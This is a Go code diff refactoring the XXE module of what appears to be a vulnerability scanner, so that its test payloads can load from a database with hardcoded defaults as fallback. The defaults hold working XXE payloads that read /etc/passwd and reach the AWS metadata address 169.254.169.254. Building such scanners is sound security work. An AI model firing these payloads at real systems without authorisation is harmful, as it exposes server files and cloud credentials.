@@ -7,15 +7,18 @@ import (
 	"strings"
 	"time"
 
+	"vulnscan-backend/model"
+	"vulnscan-backend/pkg/payload"
 	"vulnscan-backend/scan/engine"
 )
 
 type XXEScanner struct {
-	base *engine.VulnScanner
+	base     *engine.VulnScanner
+	payloads *payload.Loader
 }
 
-func New() *XXEScanner {
-	return &XXEScanner{}
+func New(loader *payload.Loader) *XXEScanner {
+	return &XXEScanner{payloads: loader}
 }
 
 func (m *XXEScanner) ID() string       { return "xxe" }
@@ -24,18 +27,6 @@ func (m *XXEScanner) Category() string { return "vuln" }
 
 func (m *XXEScanner) Params() []engine.ModuleParam {
 	return []engine.ModuleParam{engine.VulnVerificationParam()}
-}
-
-func (m *XXEScanner) Run(ctx context.Context, targets []*engine.Target, config map[string]interface{}) (*engine.ModuleResult, error) {
-	m.base = engine.NewVulnScanner(config)
-	verifyLevel := engine.GetConfigValue(config, "verification_level", "both")
-
-	result := m.base.RunTargets(ctx, m.ID(), targets, func(ctx context.Context, target *engine.Target) []*engine.Finding {
-		return m.testTarget(ctx, target, verifyLevel)
-	})
-
-	engine.LogModuleComplete(m.ID(), len(targets), len(result.Findings), result.Duration)
-	return result, nil
 }
 
 var hostnamePattern = regexp.MustCompile(`^[a-zA-Z0-9._-]+$`)
@@ -51,6 +42,18 @@ var xmlParserErrors = []*regexp.Regexp{
 	regexp.MustCompile(`(?i)XMLSyntaxError`),
 	regexp.MustCompile(`(?i)Start tag expected`),
 	regexp.MustCompile(`(?i)EntityRef`),
+}
+
+func (m *XXEScanner) Run(ctx context.Context, targets []*engine.Target, config map[string]interface{}) (*engine.ModuleResult, error) {
+	m.base = engine.NewVulnScanner(config)
+	verifyLevel := engine.GetConfigValue(config, "verification_level", "both")
+
+	result := m.base.RunTargets(ctx, m.ID(), targets, func(ctx context.Context, target *engine.Target) []*engine.Finding {
+		return m.testTarget(ctx, target, verifyLevel)
+	})
+
+	engine.LogModuleComplete(m.ID(), len(targets), len(result.Findings), result.Duration)
+	return result, nil
 }
 
 func (m *XXEScanner) testTarget(ctx context.Context, target *engine.Target, verifyLevel string) []*engine.Finding {
@@ -141,12 +144,48 @@ func (m *XXEScanner) testEntityEcho(ctx context.Context, target *engine.Target) 
 	return nil
 }
 
-func (m *XXEScanner) testFileRead(ctx context.Context, target *engine.Target) *engine.Finding {
-	filePayloads := []struct {
-		payload  string
-		evidence string
-		file     string
-	}{
+type xxeFilePayload struct {
+	payload  string
+	evidence string
+	file     string
+}
+
+func (m *XXEScanner) getFilePayloads() []xxeFilePayload {
+	if m.payloads != nil {
+		dbPayloads := m.payloads.GetPayloads("xxe")
+		var result []xxeFilePayload
+		for _, p := range dbPayloads {
+			if p.Type == "file_read" {
+				evidence := p.Expect
+				if evidence == "" {
+					if strings.Contains(p.Value, "passwd") {
+						evidence = "root:x:0:0"
+					} else if strings.Contains(p.Value, "win.ini") {
+						evidence = "[fonts]"
+					} else if strings.Contains(p.Value, "php://filter") {
+						evidence = "PD9waHA"
+					}
+				}
+				file := p.Name
+				if file == "" {
+					file = p.Value
+				}
+				result = append(result, xxeFilePayload{
+					payload:  p.Value,
+					evidence: evidence,
+					file:     file,
+				})
+			}
+		}
+		if len(result) > 0 {
+			return result
+		}
+	}
+	return defaultFilePayloads()
+}
+
+func defaultFilePayloads() []xxeFilePayload {
+	return []xxeFilePayload{
 		{
 			`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><data>&xxe;</data></root>`,
 			"root:x:0:0",
@@ -163,8 +202,10 @@ func (m *XXEScanner) testFileRead(ctx context.Context, target *engine.Target) *e
 			"c:/windows/win.ini",
 		},
 	}
+}
 
-	for _, fp := range filePayloads {
+func (m *XXEScanner) testFileRead(ctx context.Context, target *engine.Target) *engine.Finding {
+	for _, fp := range m.getFilePayloads() {
 		select {
 		case <-ctx.Done():
 			return nil
@@ -211,12 +252,44 @@ func (m *XXEScanner) testFileRead(ctx context.Context, target *engine.Target) *e
 	return nil
 }
 
-func (m *XXEScanner) testSSRFViaXXE(ctx context.Context, target *engine.Target) *engine.Finding {
-	metadataPayloads := []struct {
-		payload  string
-		evidence string
-		target   string
-	}{
+type xxeSSRFPayload struct {
+	payload  string
+	evidence string
+	target   string
+}
+
+func (m *XXEScanner) getSSRFPayloads() []xxeSSRFPayload {
+	if m.payloads != nil {
+		dbPayloads := m.payloads.GetPayloads("xxe")
+		var result []xxeSSRFPayload
+		for _, p := range dbPayloads {
+			if p.Type == "blind" || p.Type == "ssrf" {
+				evidence := p.Expect
+				if evidence == "" {
+					if strings.Contains(p.Value, "169.254.169.254") {
+						evidence = "ami-id"
+					}
+				}
+				target := p.Name
+				if target == "" {
+					target = "Internal Service"
+				}
+				result = append(result, xxeSSRFPayload{
+					payload:  p.Value,
+					evidence: evidence,
+					target:   target,
+				})
+			}
+		}
+		if len(result) > 0 {
+			return result
+		}
+	}
+	return defaultSSRFPayloads()
+}
+
+func defaultSSRFPayloads() []xxeSSRFPayload {
+	return []xxeSSRFPayload{
 		{
 			`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>`,
 			"ami-id",
@@ -228,8 +301,10 @@ func (m *XXEScanner) testSSRFViaXXE(ctx context.Context, target *engine.Target) 
 			"AWS Metadata",
 		},
 	}
+}
 
-	for _, mp := range metadataPayloads {
+func (m *XXEScanner) testSSRFViaXXE(ctx context.Context, target *engine.Target) *engine.Finding {
+	for _, mp := range m.getSSRFPayloads() {
 		select {
 		case <-ctx.Done():
 			return nil
@@ -265,3 +340,5 @@ func (m *XXEScanner) testSSRFViaXXE(ctx context.Context, target *engine.Target) 
 
 	return nil
 }
+
+var _ = model.VulnPayload{}
